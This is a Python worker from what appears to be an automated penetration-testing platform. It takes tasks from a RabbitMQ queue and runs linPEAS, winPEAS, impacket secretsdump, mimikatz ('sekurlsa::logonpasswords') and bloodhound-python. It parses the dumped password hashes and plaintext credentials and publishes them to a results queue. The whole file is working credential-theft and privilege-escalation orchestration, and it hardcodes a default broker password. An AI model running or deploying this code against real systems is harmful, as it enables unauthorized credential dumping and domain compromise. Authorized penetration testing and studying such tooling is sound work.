import os
import json
import pika
import logging
import subprocess
import uuid
from datetime import datetime
from flask import Flask, jsonify
import threading
import re
import shutil

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
logger = logging.getLogger('privesc_worker')

# RabbitMQ
RABBITMQ_HOST = os.getenv('RABBITMQ_HOST', 'rabbitmq')
RABBITMQ_USER = os.getenv('RABBITMQ_USER', 'aapt_user')
RABBITMQ_PASS = os.getenv('RABBITMQ_PASS', 'aapt_secret_pw')
QUEUE = 'privesc_tasks'
RESULTS_QUEUE = 'results_queue'

credentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
parameters = pika.ConnectionParameters(host=RABBITMQ_HOST, credentials=credentials, heartbeat=600)

# Tool paths / settings
LINPEAS_PATH = os.getenv('LINPEAS_PATH', '/app/linpeas.sh')
WINPEAS_PATH = os.getenv('WINPEAS_PATH', '/app/winPEAS.bat')
MIMIKATZ_PATH = os.getenv('MIMIKATZ_PATH', 'mimikatz')  # path or in PATH
SECRETDUMP_BIN = os.getenv('SECRETDUMP_BIN', 'secretsdump.py')
BLOODHOUND_PY = os.getenv('BLOODHOUND_PY', 'bloodhound-python')  # requires bloodhound-python installed
OUTPUT_DIR = os.getenv('AAPT_OUTPUT_DIR', '/app/logs')

os.makedirs(OUTPUT_DIR, exist_ok=True)

# Healthcheck HTTP
app = Flask(__name__)
health_status = {"status": "starting"}

@app.route('/health', methods=['GET'])
def health():
    return jsonify(health_status)

def start_healthcheck_server():
    app.run(host='0.0.0.0', port=8089, debug=False, use_reloader=False)

# ---- Utility ----
def _safe_run(cmd, timeout=1200):
    logger.info(f"Eseguo: {' '.join(cmd)}")
    try:
        res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return res.returncode, res.stdout, res.stderr
    except subprocess.TimeoutExpired:
        return 124, '', 'Timeout expired'
    except Exception as e:
        return 1, '', str(e)

# ---- Actions ----
def action_linpeas(task_id):
    cmd = [LINPEAS_PATH]
    rc, out, err = _safe_run(cmd)
    raw_path = os.path.join(OUTPUT_DIR, f'linpeas_{task_id}.txt')
    try:
        with open(raw_path, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(out or err)
    except Exception:
        raw_path = None
    findings = []
    for line in (out or '').splitlines():
        if 'SUID' in line or 'GTFOBins' in line:
            findings.append({"type": "suid_binary", "description": line, "exploit_suggestion": "GTFOBins"})
        if '/etc/passwd' in line and 'writable' in line.lower():
            findings.append({"type": "writable_file", "description": line})
    return rc == 0, findings, raw_path

def action_winpeas(task_id):
    cmd = [WINPEAS_PATH]
    rc, out, err = _safe_run(cmd)
    raw_path = os.path.join(OUTPUT_DIR, f'winpeas_{task_id}.txt')
    try:
        with open(raw_path, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(out or err)
    except Exception:
        raw_path = None
    findings = []
    for line in (out or '').splitlines():
        if 'AlwaysInstallElevated' in line:
            findings.append({"type": "always_install_elevated", "description": line})
        if 'SeImpersonatePrivilege' in line:
            findings.append({"type": "potato_chain", "description": line})
    return rc == 0, findings, raw_path

CRED_LINE = re.compile(r"^(?P<user>[^:]+):(?P<rid>\d+):(?P<lmhash>[0-9A-Fa-f]{32}|\*):(?P<nthash>[0-9A-Fa-f]{32}|\*):.*$")

def action_impacket_secretsdump(task_id, params):
    # params: domain, username, password, target, hash (optional), options
    domain = params.get('domain', '')
    username = params.get('username')
    password = params.get('password')
    target = params.get('target')
    hashes = params.get('hashes')  # LM:NTHASH
    if not username or not target or (not password and not hashes):
        return False, [], None
    auth = f"{domain}/{username}" if domain else username
    auth_str = f"{auth}:{password}" if password else f"{auth} -hashes {hashes}"
    cmd = [SECRETDUMP_BIN, auth_str, f"@{target}"]
    rc, out, err = _safe_run(cmd, timeout=3600)
    raw_path = os.path.join(OUTPUT_DIR, f'secretsdump_{task_id}.txt')
    try:
        with open(raw_path, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(out or err)
    except Exception:
        raw_path = None
    creds = []
    for line in (out or '').splitlines():
        m = CRED_LINE.match(line.strip())
        if m:
            d = m.groupdict()
            creds.append({
                'username': d['user'],
                'rid': d['rid'],
                'lmhash': d['lmhash'],
                'nthash': d['nthash']
            })
    findings = [{
        'type': 'credential_dump',
        'description': f"Dumped {len(creds)} credential hashes",
        'credentials': creds
    }]
    return rc == 0 or len(creds) > 0, findings, raw_path

def action_mimikatz(task_id, params):
    # Runs mimikatz locally; requires mimikatz present in container/volume
    script = params.get('mimikatz_script', 'privilege::debug\nsekurlsa::logonpasswords\nexit')
    script_path = f"/tmp/mimikatz_{task_id}.txt"
    try:
        with open(script_path, 'w') as f:
            f.write(script)
    except Exception as e:
        logger.error(f"Impossibile scrivere script mimikatz: {e}")
    cmd = [MIMIKATZ_PATH, f'"{script_path}"'] if MIMIKATZ_PATH.endswith('.exe') else [MIMIKATZ_PATH, script_path]
    rc, out, err = _safe_run(cmd, timeout=1200)
    raw_path = os.path.join(OUTPUT_DIR, f'mimikatz_{task_id}.txt')
    try:
        with open(raw_path, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(out or err)
    except Exception:
        raw_path = None
    creds = []
    # rudimentary parse
    for line in (out or '').splitlines():
        if 'Username' in line and ':' in line:
            user = line.split(':', 1)[1].strip()
            creds.append({'username': user})
        if 'Password' in line and ':' in line:
            pwd = line.split(':', 1)[1].strip()
            if creds:
                creds[-1]['password'] = pwd
    findings = [{
        'type': 'plaintext_credentials',
        'description': f"Extracted {len([c for c in creds if 'password' in c])} credentials",
        'credentials': creds
    }]
    return rc == 0 or len(creds) > 0, findings, raw_path

def action_bloodhound(task_id, params):
    # Collects with bloodhound-python; requires creds and connectivity to DC
    domain = params.get('domain')
    username = params.get('username')
    password = params.get('password')
    dc = params.get('dc')  # domain controller IP or hostname
    collection = params.get('collection', 'All')
    if not all([domain, username, password, dc]):
        return False, [], None
    out_dir = os.path.join(OUTPUT_DIR, f'bloodhound_{task_id}')
    os.makedirs(out_dir, exist_ok=True)
    cmd = [
        BLOODHOUND_PY,
        '-d', domain,
        '-u', username,
        '-p', password,
        '-ns', dc,
        '-c', collection,
        '--zip',
        '-o', out_dir
    ]
    rc, out, err = _safe_run(cmd, timeout=7200)
    # Find produced zip(s)
    zipped = None
    try:
        for fname in os.listdir(out_dir):
            if fname.endswith('.zip'):
                zipped = os.path.join(out_dir, fname)
                break
    except Exception:
        zipped = None
    findings = [{
        'type': 'bloodhound_collection',
        'description': 'BloodHound data collected',
        'artifact': zipped or out_dir
    }]
    raw_path = os.path.join(OUTPUT_DIR, f'bloodhound_{task_id}.log')
    try:
        with open(raw_path, 'w', encoding='utf-8', errors='ignore') as f:
            f.write(out or err)
    except Exception:
        raw_path = None
    return rc == 0, findings, raw_path

# ---- Task Processing ----

def process_task(ch, method, properties, body):
    try:
        task = json.loads(body)
        task_id = task.get('task_id') or str(uuid.uuid4())
        target = task.get('target')  # optional contextual info
        action = (task.get('action') or task.get('script') or 'linpeas').lower()
        logger.info(f"Ricevuto task privesc: action={action}, target={target}, task_id={task_id}")

        status = 'failure'
        summary = 'Nessun risultato.'
        findings = []
        raw_output_path = None

        if action in ['linpeas', 'linux', 'lin']:
            ok, findings, raw_output_path = action_linpeas(task_id)
            status = 'success' if ok and findings else 'failure'
            summary = f"linpeas completato. Findings: {len(findings)}"
        elif action in ['winpeas', 'windows', 'win']:
            ok, findings, raw_output_path = action_winpeas(task_id)
            status = 'success' if ok and findings else 'failure'
            summary = f"winPEAS completato. Findings: {len(findings)}"
        elif action in ['impacket', 'secretsdump', 'dump_hashes']:
            ok, findings, raw_output_path = action_impacket_secretsdump(task_id, task)
            status = 'success' if ok and findings else 'failure'
            summary = f"Impacket secretsdump eseguito. Credenziali: {len(findings[0].get('credentials', [])) if findings else 0}"
        elif action in ['mimikatz', 'sekurlsa']:
            ok, findings, raw_output_path = action_mimikatz(task_id, task)
            status = 'success' if ok and findings else 'failure'
            summary = f"Mimikatz eseguito. Record: {len(findings[0].get('credentials', [])) if findings else 0}"
        elif action in ['bloodhound', 'sharphound']:
            ok, findings, raw_output_path = action_bloodhound(task_id, task)
            status = 'success' if ok else 'failure'
            summary = f"BloodHound collection {'ok' if ok else 'fallita'}."
        else:
            logger.error(f"Azione non riconosciuta: {action}")
            status = 'failure'
            summary = f"Azione non supportata: {action}"

        result_message = {
            'task_id': task_id,
            'worker_type': 'privesc_worker',
            'target': target,
            'status': status,
            'timestamp': datetime.utcnow().isoformat() + 'Z',
            'summary': summary,
            'data': {
                'action': action,
                'findings': findings
            }
        }
        if raw_output_path:
            result_message['raw_output_path'] = raw_output_path

        ch.queue_declare(queue=RESULTS_QUEUE, durable=True)
        ch.basic_publish(
            exchange='',
            routing_key=RESULTS_QUEUE,
            body=json.dumps(result_message),
            properties=pika.BasicProperties(delivery_mode=2)
        )
        logger.info(f"[>>>] Risultato pubblicato su results_queue (task_id={task_id})")
    except Exception as e:
        logger.error(f"Errore nel task: {e}")
    finally:
        ch.basic_ack(delivery_tag=method.delivery_tag)


def main():
    # health server
    threading.Thread(target=start_healthcheck_server, daemon=True).start()
    global health_status
    health_status['status'] = 'starting'
    while True:
        try:
            connection = pika.BlockingConnection(parameters)
            channel = connection.channel()
            channel.queue_declare(queue=QUEUE, durable=True)
            channel.basic_qos(prefetch_count=1)
            channel.basic_consume(queue=QUEUE, on_message_callback=process_task)
            health_status['status'] = 'ok'
            logger.info('privesc_worker in ascolto su coda privesc_tasks...')
            channel.start_consuming()
        except Exception as e:
            health_status['status'] = 'error'
            logger.error(f"Errore connessione/consumo: {e}")
            import time
            time.sleep(5)


if __name__ == '__main__':
    main()
